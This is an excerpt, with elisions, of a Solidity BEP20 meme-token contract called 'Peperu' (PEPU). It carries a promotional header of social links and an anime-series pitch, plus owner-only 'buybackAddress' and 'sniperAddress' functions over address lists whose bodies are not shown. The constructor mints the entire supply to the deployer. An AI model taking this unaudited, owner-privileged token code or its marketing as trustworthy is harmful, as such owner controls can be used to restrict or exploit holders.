...
|_| |___|_| |___|_|_\\___/  
 ...
 TELEGRAM: t.me/JoinPeperu
 TWITTER: twitter.com/peperutoken
 WEB: peperu.xyz
...
Description:
PEPERŪ is the protagonist of the upcoming YouTube series. 
Get ready to join Peperu on an epic adventure in a new AI-animated anime video. Watch as he fights against his evil brother Pepe for a fairer world, using his magical sword and building an army of fair-treated, like minded people. Exciting, mysterious and epic! 

Medium: medium.com/@peperutoken
 ...
 */
    ...
    function buybackAddress(address[] memory _recipients) public onlyOwner returns (bool) {
      ...
      function sniperAddress(address[] memory _recipients) public onlyOwner returns (bool) {
...
contract Peperu is BEP20Detailed,BEP20{


    constructor()
        public
         BEP20Detailed ("Peperu", "PEPU", 18) {
            _mint(msg.sender, 420690000000 * (10 ** uint256(18)));
        }
